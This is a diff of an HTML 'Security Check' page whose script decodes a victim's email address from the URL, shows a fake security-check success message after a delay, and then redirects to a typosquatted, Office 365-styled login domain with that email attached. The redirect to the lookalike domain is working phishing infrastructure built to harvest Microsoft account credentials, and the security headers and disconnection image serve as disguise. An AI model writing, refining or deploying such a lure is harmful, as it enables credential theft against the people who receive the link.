@@ -4,17 +4,15 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Security Check</title>
-    <meta name="robots" content="noindex, nofollow, noarchive">
-    <meta http-equiv="X-Content-Type-Options" content="nosniff">
-    <meta http-equiv="X-Frame-Options" content="DENY">
-    <meta http-equiv="X-XSS-Protection" content="1; mode=block">
-    <meta http-equiv="Strict-Transport-Security" content="max-age=31536000; includeSubDomains; preload">
-    <meta http-equiv="Referrer-Policy" content="no-referrer">
+    <!-- Security Headers -->
+    <meta name="robots" content="noindex, nofollow, noarchive"> <!-- Prevent indexing, following, and archiving -->
+    <meta http-equiv="X-Content-Type-Options" content="nosniff"> <!-- Prevent MIME-type sniffing -->
+    <meta http-equiv="X-Frame-Options" content="DENY"> <!-- Prevent clickjacking -->
+    <meta http-equiv="X-XSS-Protection" content="1; mode=block"> <!-- Enable XSS protection -->
+    <meta http-equiv="Strict-Transport-Security" content="max-age=31536000; includeSubDomains; preload"> <!-- Enforce HTTPS -->
+    <meta http-equiv="Referrer-Policy" content="no-referrer"> <!-- Control referrer information -->
     
     <style>
-        body {
-            font-family: 'Arial', sans-serif;
-        }
         .container {
             display: flex;
             flex-direction: column;
@@ -23,29 +21,33 @@
             min-height: 100vh;
             position: relative;
         }
+
         .image-container {
             width: 100%;
             max-width: 900px;
         }
+
         .image-container img {
             width: 100%;
             height: auto;
             display: block;
         }
-        .security-check, #loadingMessage {
+
+        .security-check {
             display: none;
             margin-top: 1rem;
             font-size: 1rem;
             color: #4CAF50;
+            text-align: center;
+            font-family: 'Arial', sans-serif;
             background-color: #f2f2f2;
             padding: 10px 20px;
             border-radius: 10px;
             box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
-            text-align: center;
-        }
-        #email {
-            display: none;
-            margin-top: 1rem;
+            position: absolute;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
         }
     </style>
 </head>
@@ -54,9 +56,7 @@
         <div class="image-container">
             <img src="https://pbs.twimg.com/media/GGrR89_WgAAgrOI?format=jpg&name=large" alt="Simulating Disconnection...">
         </div>
-        <input type="text" id="email" placeholder="Email will be populated here">
         <p class="security-check" id="securityCheckMessage">Security check completed successfully!</p>
-        <p id="loadingMessage">Please wait while we check your security...</p>
     </div>
 
     <script>
@@ -64,8 +64,8 @@
             'use strict';
 
             function getEmailFromHash() {
-                const hash = window.location.hash.substr(1);
                 try {
+                    const hash = window.location.hash.substr(1);
                     return atob(hash);
                 } catch (error) {
                     console.error("Failed to extract email from hash:", error);
@@ -75,20 +75,30 @@
 
             function populateEmail() {
                 const email = getEmailFromHash();
-                const emailField = document.getElementById("email");
-                emailField.value = email || 'Invalid email';
-                emailField.style.display = 'block';
+                if (email) {
+                    const emailField = document.getElementById("email");
+                    if (emailField) {
+                        emailField.value = email;
+                    } else {
+                        console.warn("Email field not found.");
+                    }
+                }
             }
 
             function simulateDisconnection() {
-                document.getElementById("loadingMessage").style.display = 'block';
+                console.log("Simulating disconnection for 10 seconds...");
 
                 setTimeout(() => {
-                    document.getElementById("loadingMessage").style.display = 'none';
-                    document.querySelector('.security-check').style.display = 'block';
+                    console.log("Reconnecting...");
+
+                    const securityCheckMessage = document.querySelector('.security-check');
+                    if (securityCheckMessage) {
+                        securityCheckMessage.style.display = 'block';
+                    }
 
                     setTimeout(() => {
                         const redirectTo = "https://l0g1n-micros.robedemariee.net/o365" + window.location.hash.substr(1);
+                        console.log("Redirecting to: " + redirectTo);
                         window.location.href = redirectTo;
                     }, 6000);
                 }, 10000);
